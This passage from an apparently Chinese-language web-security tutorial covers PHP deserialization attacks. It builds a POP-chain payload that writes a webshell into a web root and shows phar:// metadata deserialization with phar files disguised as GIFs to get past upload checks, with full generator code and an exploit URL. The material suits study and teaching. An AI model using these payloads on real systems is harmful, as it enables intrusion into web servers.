    foreach ($lyrics as $lyric) {
      $s = intval($lyric);
      $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;);
      while (($row = $result-&gt;fetch_row()) != NULL) {
        $r []= unserialize(base64_decode($row[0]));
      }
    }
    return $r;
  }

  function addLyrics($lyrics) {
    $ids = array();
    foreach ($lyrics as $lyric) {
      $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\&quot;)&quot;);
      $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;);
      $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]);
    }
    echo var_dump($ids);
    return $ids; 
  }

  function __destruct() {
    $this-&gt;conn-&gt;close();
    $this-&gt;conn = NULL;
  }
};</code></pre><p>代码这么长啊，放心，通常都会有很多用不到的类，而且一步步的回溯都不困难。</p>
<p>首先我们先找到能利用的危险函数</p>
<ul>
<li>LogWriter_File类中的file_put_contents函数，可以用来写木马。</li>
<li>OutputFilter类中，由于preg_replace函数pattern可控，如果在php版本不高于5.5的情况下可以执行命令。</li>
</ul>
<p>好，这里我就只分析file_put_contents函数写木马的POP链怎么构造。</p>
<p>​    找到了危险函数就要找可以利用的魔法方法啦，每一个类的魔法方法都一个个的跟踪的话我感觉比较麻烦，我比较喜欢通过危险函数一步步的追溯到可以利用的魔法方法。</p>
<p>​    首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，搜索在Logger类的log方法中执行了WriteLog方法，搜索发现在Song类的log函数执行了Logger类的log方法。最后，在Lyrics类的__destruct魔法方法中执行了Song类的log函数。</p>
<p>​    理清楚了这个链条，那么我们下一步就是构造反序列化数据并想办法把我们要写的木马内容和地址放在里面，而这个链条的所有类我们只需要考虑相关的类方法，在链条中不存在类方法可以直接注释掉。值得注意的是，这意味着下面的好几个类没有用了。</p>
<p>​    先把用不到的类和部分类没有用到的方法(没有用到的方法是不用分析的，包括没用的属性)。并且，要知道这些类的__construct()方法仅仅作用在于帮我们构造，如果它们里面存在限制的话我们完全可以删掉。</p>
<p>​    就比如Song类，其实我们只用到了log函数，再加上__construct方法帮我们构造，其他的函数大可删掉。log()函数用到了<code>$name</code>和<code>$group</code>属性，再加上构造POP链的<code>$logger</code>，剩下<code>$url</code>参数完全可以删掉。精简如下：</p>
<pre><code>class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this-&gt;matchPattern = $pattern;
    $this-&gt;replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this-&gt;filters = $filters;
    $this-&gt;endl = $endl;
  }

  function format($txt) {
    foreach ($this-&gt;filters as $filter) {
      $txt = $filter-&gt;filter($txt);
    }
    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this-&gt;format = $format;
    $this-&gt;filename = $filename;
  }
  function writeLog($txt) {
    $txt = $this-&gt;format-&gt;format($txt);
    //TODO: Modify the address here, and delete this TODO.
    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this-&gt;logwriter = $writer;
  }
  function log($txt) {
    $this-&gt;logwriter-&gt;writeLog($txt);
  }
};

class Song {
  protected $logger; 
  protected $name;
  protected $group;
  function __construct($name, $group, $logger) {
    $this-&gt;name = $name;
    $this-&gt;group = $group;
    $this-&gt;logger = $logger;
  }
  function log() {
    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);
  }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this-&gt;song = $song;
    $this-&gt;lyrics = $lyrics;
  }
  function __toString() {
    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;
  }
  function __destruct() {
    $this-&gt;song-&gt;log();
  }
};</code></pre><p>​    到了最后的构造时间，从危险函数开始构造。</p>
<p>​        首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，LogWriter_File类的第一个参数是写入文件的文件名，第二个是LogFileFormat类实例(可以看到，第二个参数返回的是被过滤的写入文件的内容)。LogFileFormat类第一个参数是OutputFilter类实例，第二个是替换’\n’的字符。OutputFilter类第一个参数是pattern，第二个是替换对象，为了不过滤OutputFilter两个参数设置一样的。</p>
<pre><code>$outputfilter = new OutputFilter(&quot;&quot;, &quot;&quot;);
$logfileformat = new LogFileFormat($outputfilter, &quot;\n&quot;);
$log_write_file = new LogWriter_File(&#39;../../../../var/www/html/webshell.php&#39;, $logfileformat);</code></pre><p>​    以上再顺便把shell地址改到web目录。</p>
<p>​    接下来是Logger类用到了LogWriter_File类，只有一个参数正好是LogWrite_Fiel类。</p>
<pre><code>$logger = new Logger($log_write_file);</code></pre><p>接下来是Song类调用了Logger的log方法，参数便为WriteLog的参数，即为写入文件的内容。最后套如$Lyrics类中。</p>
<pre><code>$song = new Song(&#39;JrXnm&#39;,&#39;&lt;?php phpinfo() ?&gt; &#39;, $logger);
$lyrics = new Lyrics(&#39;JrXnm&#39;,$song);</code></pre><p>最后整体的payload为：</p>
<pre><code>&lt;?php

class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this-&gt;matchPattern = $pattern;
    $this-&gt;replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this-&gt;filters = $filters;
    $this-&gt;endl = $endl;
  }

  function format($txt) {
    foreach ($this-&gt;filters as $filter) {
      $txt = $filter-&gt;filter($txt);
    }
    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this-&gt;format = $format;
    $this-&gt;filename = $filename;
  }
  function writeLog($txt) {
    $txt = $this-&gt;format-&gt;format($txt);
    //TODO: Modify the address here, and delete this TODO.
    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this-&gt;logwriter = $writer;
  }
  function log($txt) {
    $this-&gt;logwriter-&gt;writeLog($txt);
  }
};

class Song {
  protected $logger; 
  protected $name;
  protected $group;
  function __construct($name, $group, $logger) {
    $this-&gt;name = $name;
    $this-&gt;group = $group;
    $this-&gt;logger = $logger;
  }
  function log() {
    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);
  }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this-&gt;song = $song;
    $this-&gt;lyrics = $lyrics;
  }
  function __toString() {
    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;
  }
  function __destruct() {
    $this-&gt;song-&gt;log();
  }
};
$outputfilter = new OutputFilter(&quot;&quot;, &quot;&quot;);
$logfileformat = new LogFileFormat($outputfilter, &quot;\n&quot;);
$log_write_file = new LogWriter_File(&#39;../../../../var/www/html/webshell.php&#39;, $logfileformat);

$logger = new Logger($log_write_file);

$song = new Song(&#39;JrXnm&#39;,&#39;&lt;?php phpinfo() ?&gt; &#39;, $logger);
$lyrics = new Lyrics(&#39;JrXnm&#39;,$song);

echo urlencode(serialize($lyrics));</code></pre><p>构造pop链的文章还可以参考：</p>
<p><a href="https://www.anquanke.com/post/id/170681#h2-0" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链(一)</a></p>
<p><a href="https://www.anquanke.com/post/id/170714" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（二）</a></p>
<p><a href="https://www.freebuf.com/column/205855.html" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（三）</a></p>
<h4 id="反序列化配合phar-协议"><a href="#反序列化配合phar-协议" class="headerlink" title="反序列化配合phar://协议"></a>反序列化配合phar://协议</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员Sam Thomas分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。<br><strong>该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</strong></p>
<h5 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h5><h6 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h6><p>可以理解为一个标志，格式为<code>xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h6 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-d8f57b88969d1d6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h6 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h6><p>被压缩文件的内容。</p>
<h6 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件末尾，格式如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-5769eb3536407bd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h5 id="Demo测试"><a href="#Demo测试" class="headerlink" title="Demo测试"></a>Demo测试</h5><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。<br>注意：要将php.ini中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p>
<p>phar_gen.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
    <span class="token comment" spellcheck="true">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>可以明显的看到meta-data是以序列化的形式存储的：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-f256545accf32fdc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-901f0c120d3edee8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过一个小demo证明一下<br>phar_test1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.phar/test.txt';</span>
    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-d5ec1857efa0ed58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其他函数当然也是可行的,当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p>
<h5 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h5><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
    <span class="token comment" spellcheck="true">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-c872ef40ddff63ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>将后缀改为gif进行测试</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.gif/test.txt';</span>
    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-7a55385aec21b74f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>采用这种方法可以绕过很大一部分上传检测。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>phar文件要能够上传到服务器端。</li>
<li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。</li>
<li>文件操作函数的参数可控，且<code>: / phar</code>等特殊字符没有被过滤。</li>
</ul>
<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token string">'gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Temp file: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token keyword">else</span>
  <span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token string">"Invalid file,you can only upload gif"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span></code></pre>
<p>upload_file.html</p>
<pre class=" language-markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://localhost/upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
<p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>根据file_un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</strong><br>构造eval.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>访问eval.php生成phar.phar，将后缀改为gif。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-76b33b8e7dc5c1a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后上传到目录下与<code>file_un.php</code>同目录，利用<code>file_un.php</code>中的危险函数getshell<br>payload:<code>file_un.php?filename=phar://phar.gif/test</code><br><img src="https://upload-images.jianshu.io/upload_images/9113969-dd5905733c0bf54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h4 id="靶场相关题目"><a href="#靶场相关题目" class="headerlink" title="靶场相关题目"></a>靶场相关题目</h4><h5 id="攻防世界（unserialize3"><a href="#攻防世界（unserialize3" class="headerlink" title="攻防世界（unserialize3)"></a>攻防世界（unserialize3)</h5><p>题目来源:攻防世界 web进阶区</p>
<img src="QQ截图20200114184702.png"  />

